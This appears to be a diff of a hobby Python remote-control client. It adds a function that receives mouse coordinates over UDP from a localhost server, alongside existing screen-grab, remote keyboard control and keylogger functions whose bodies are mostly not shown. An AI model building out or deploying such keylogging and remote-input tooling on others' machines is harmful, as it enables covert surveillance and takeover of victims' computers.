@@ -4,6 +4,8 @@ import sys
 from PIL import ImageGrab
 import time
 import io
+import win32api
+import json
 host = '127.0.0.1'
 def send_message_to_server(client_socket,message):
     print("Sending")
@@ -42,7 +44,7 @@ def keyboard_controlled():
     port = 5001
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((host,port))
-    print("Connected with host")
+    print("Connected with server")
     while True:
         key = s.recv(1024).decode()
         if key != "":
@@ -52,6 +54,34 @@ def keyboard_controlled():
             print("connection lost with server")
             s.close()
             break
+def mouse_controlled():
+    port = 5002
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    data = "test"
+    data = data.encode()
+    s.sendto(data,(host,port))
+    print("Sent message to server")
+    s.settimeout(5)
+    try: 
+        while True:
+            mouse_location_binary = s.recvfrom(1024)
+            mouse_location = json.loads(mouse_location_binary[0].decode())
+            print("Recived tuple: ", mouse_location)
+            x = mouse_location[0]
+            y = mouse_location[1]
+            print(f"X = {x}, Y = {y}")
+            #win32api.SetCursorPos(x,y)
+            #else:
+            #  s.close()
+            #   break
+    except socket.timeout:
+        print("Server stopped sending packets. Exiting...")
+        s.close()
+        sys.exit()
+
+
+    
+
 def keylogger():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     port = 5000
@@ -70,7 +100,8 @@ def keylogger():
     s.close()
 def main():
     #keylogger()
-    keyboard_controlled()
+    #keyboard_controlled()
+    mouse_controlled()
 if __name__ == "__main__":
     main()   
 
